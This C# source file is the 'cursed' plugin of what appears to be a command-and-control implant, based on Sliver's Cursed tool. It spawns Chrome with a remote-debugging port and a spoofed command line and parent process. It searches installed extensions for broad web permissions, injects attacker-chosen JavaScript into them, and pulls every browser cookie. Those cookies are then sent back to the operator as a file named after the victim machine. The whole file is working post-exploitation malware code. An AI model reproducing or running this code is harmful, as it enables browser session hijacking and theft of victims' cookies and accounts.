using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Reflection;

namespace Agent
{
    public class Plugin : IInteractivePlugin, IFilePlugin
    {
        //Todo in the cursed.py file, add a `launch` bool that would indicate that the user wants us to handle the execution of chrome with a debug port.
        //https://sliver.sh/docs?name=Cursed maybe implement some of these interactive commands
        //Based on the code in sliver: https://github.com/BishopFox/sliver/blob/master/client/overlord/overlord.go
        public string Name => "cursed";
        private IMessageManager messageManager { get; set; }
        private ISpawner spawner { get; set; }
        private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking" };
        private readonly List<string> alt_permissions = new List<string> { "http://*/*", "https://*/*", "webRequest", "webRequestBlocking" };
        private Dictionary<string, string> cookiesOut = new Dictionary<string, string>();
        private CursedConfig config { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.config = new CursedConfig();
            this.messageManager = messageManager;
            this.spawner = spawner;
        }
        public async Task Execute(ServerJob job)
        {
            CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);

            if (args.debug_port > 0)
            {
                this.config.debug_port = args.debug_port.ToString();
            }

            if (args.parent > 0)
            {
                this.config.parent = args.parent;
            }

            if (!string.IsNullOrEmpty(args.payload))
            {
                this.config.payload = args.payload;
            }

            if (string.IsNullOrEmpty(args.target))
            {
                this.config.target = args.target;
            }
        }
        public async Task HandleNextMessage(ServerResponseResult response)
        {
            if (!this.cookiesOut.ContainsKey(response.task_id))
            {
                return;
            }

            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                download = new DownloadResponseData
                {
                    total_chunks = 1,
                    is_screenshot = false,
                    filename = $"{Environment.MachineName}-cookies.json",
                    host = "",
                    chunk_num = 1,
                    chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
                    file_id = response.file_id,
                },
            };

            await this.messageManager.AddResponse(dr.ToJson());

            this.cookiesOut.Remove(response.task_id);
        }
        public async void Interact(InteractMessage message)
        {
            string user_input = Misc.Base64Decode(message.data).TrimEnd(Environment.NewLine.ToCharArray());
            var inputParts = Misc.SplitCommandLine(user_input);
            switch (inputParts[0])
            {
                case "cursed":
                    await this.Cursed(this.config.payload, message.task_id);
                    break;
                case "cookies":
                    await this.TryGetCookies(message.task_id);
                    break;
                case "get":
                    if (inputParts.Length < 2)
                        await this.GetValue("", message.task_id);
                    else
                        await this.GetValue(inputParts[1], message.task_id);
                    break;
                case "set":
                    string value = String.Empty;
                    if (inputParts.Length > 3)
                        value = string.Join(" ", inputParts, 2, inputParts.Length - 2);
                    else
                        value = inputParts[2].TrimStart('"').TrimEnd('"');

                    //string args = string.Join(" ", inputParts, 2, inputParts.Length -1);
                    await this.SetConfig(inputParts[1], value, message.task_id);
                    break;
                case "inject-js":
                    if (inputParts.Count() < 3)
                    {
                        await ReturnOutput("Please specify both an ID and a payload", message.task_id);
                        break;
                    }

                    var res = await DebugHelper.InjectJs(inputParts[1], inputParts[2], config);
                    break;
                case "spawn":

                    if (inputParts.Length < 2)
                    {
                        await ReturnOutput("Please specify a browser.", message.task_id);
                        break;
                    }

                    if (!await Spawn(inputParts[1], user_input, message.task_id))
                    {
                        await ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
                        break;
                    }
                    await ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                    break;
                case "exit":
                    this.config = new CursedConfig();
                    await this.messageManager.AddResponse(new InteractMessage()
                    {
                        task_id = message.task_id,
                        data = Misc.Base64Encode("Exited."),
                        message_type = InteractiveMessageType.Exit,
                    });
                    break;
                case "help":
                    await this.messageManager.AddResponse(new InteractMessage()
                    {
                        task_id = message.task_id,
                        data = Misc.Base64Encode(CommandParser.GetHelpText() + Environment.NewLine),
                        message_type = InteractiveMessageType.Output,
                    });
                    break;
            }
        }
        private async Task Cursed(string payload, string task_id)
        {
            //Parse for chosen browser
            await ReturnOutput("[+] Getting extensions", task_id);
            var extensions = await DebugHelper.GetExtensions(this.config);

            if (extensions.Count <= 0)
            {
                //No extensions installed
                await ReturnOutput("[!] No extensions found", task_id);
                return;
            }

            await ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);

            List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();

            foreach (var extension in extensions)
            {
                if (!DebugHelper.TryGetManifestFromExtension(extension, task_id, out var manifest) || manifest is null)
                {
                    continue;
                }

                var permissions = DebugHelper.GetPermissionsFromManifest(manifest);

                if (permissions.Count == 0)
                {
                    continue;
                }

                if (Misc.CheckListValues(permissions, main_permissions) || Misc.CheckListValues(alt_permissions, permissions))
                {
                    extensionCandidates.Add(extension);
                }

            }

            if (extensionCandidates.Count <= 0)
            {
                await ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
                return;
            }

            await ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);

            if (string.IsNullOrEmpty(payload))
            {
                if (string.IsNullOrEmpty(this.config.target))
                {
                    await ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
                    return;
                }
                payload = this.config.GetDefaultPayload();
            }

            await ReturnOutput("[+] Injecting our payload", task_id);
            foreach (var extension in extensionCandidates)
            {
                if (DebugHelper.TryInjectJs(extension, payload, out var response))
                {
                    await ReturnOutput("[+] Succesfully injected payload." + Environment.NewLine + $"Response: {response}", task_id);
                    return;
                }
                await ReturnOutput("[!] Failed to inject payload." + Environment.NewLine + $"Response: {response}", task_id);
            }
        }
        private async Task<bool> TryGetCookies(string task_id)
        {
            List<ChromeJsonObject> extensions = await DebugHelper.GetExtensions(this.config);

            if (extensions.Count == 0)
            {
                return false;
            }

            string response = await DebugHelper.InjectGetAllCookies(extensions.First());

            if (string.IsNullOrEmpty(response))
            {
                await ReturnOutput("[!] Failed to inject JS for cookies request", task_id);
                return false;
            }

            JsonDocument responseJsonDocument = JsonDocument.Parse(response);
            JsonElement responseRoot = responseJsonDocument.RootElement;

            if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
            {
                //Strip outer edge, leaving only the good inside
                await ReturnOutput("[+] Returning parsed cookies file", task_id);
                this.cookiesOut.Add(task_id, resultElement.GetRawText());
                await StartSendFile(task_id);
                return true;
            }

            //Something fucked up, so just return the raw response
            await ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
            this.cookiesOut.Add(task_id, response);
            await StartSendFile(task_id);
            return false;
        }
        private async Task<bool> Spawn(string choice, string full_cmdline, string task_id)
        {
            string commandline = string.Empty;

            switch (choice.ToLower())
            {
                case "chrome":
                    commandline = $"{ChromeFinder.FindChromePath()} --remote-debugging-port={this.config.debug_port}";
                    break;
                case "edge":
                    break;
                default:
                    commandline = full_cmdline;
                    return false;
            }

            string spoofedcmdline = string.Empty;
            if (!string.IsNullOrEmpty(this.config.cmdline))
            {
                spoofedcmdline = $"{ChromeFinder.FindChromePath()} {this.config.cmdline}";
            }

            SpawnOptions opts = new SpawnOptions()
            {
                task_id = task_id,
                commandline = commandline,
                spoofedcommandline = spoofedcmdline,
                output = false,
                parent = this.config.parent
            };

            return await spawner.Spawn(opts);
        }
        private async Task SetConfig(string choice, string value, string task_id)
        {
            Type type = config.GetType();
            PropertyInfo property = type.GetProperty(choice);

            if (property != null)
            {
                if (choice == "parent")
                    property.SetValue(config, int.Parse(value.ToString()));
                else
                    property.SetValue(config, value);

                await ReturnOutput("Set " + choice + " to " + value, task_id);
            }
            else
            {
                await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
            }
        }
        private async Task GetValue(string choice, string task_id)
        {
            switch (choice.ToLower())
            {
                case "extensions":
                    var extensions = await DebugHelper.GetExtensions(this.config);
                    await ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
                    break;
                case "":
                case null:
                    foreach (var prop in config.GetType().GetProperties())
                    {
                        if (prop.GetValue(config) is null)
                        {
                            await ReturnOutput($"{prop.Name}: <empty>", "");
                        }
                        else
                        {
                            await ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
                        }

                    }
                    break;
                default:
                    Type type = config.GetType();                    
                    try
                    {
                        var property = type.GetProperty(choice);
                        if(property is null)
                        {
                            await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                            return;
                        }

                        var propVal = property.GetValue(config);

                        if(propVal is null)
                        {
                            await ReturnOutput($"{choice}: <empty>", task_id);
                            return;
                        }

                        await ReturnOutput($"{choice}: {propVal}", task_id);
                    }
                    catch
                    {
                        await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                    }
                break;

            }
        } 
        private async Task StartSendFile(string task_id)
        {
            await messageManager.AddResponse(new DownloadResponse
            {
                download = new DownloadResponseData()
                {
                    total_chunks = 1,
                    filename = $"{Environment.MachineName}-cookies.json",
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                },
                task_id = task_id,
            }.ToJson());
        }
        private async Task ReturnOutput(string message, string task_id)
        {
            await this.messageManager.AddResponse(new InteractMessage()
            {
                task_id = task_id,
                data = Misc.Base64Encode(message + Environment.NewLine),
                message_type = InteractiveMessageType.Output,
            });
        }
    }
}
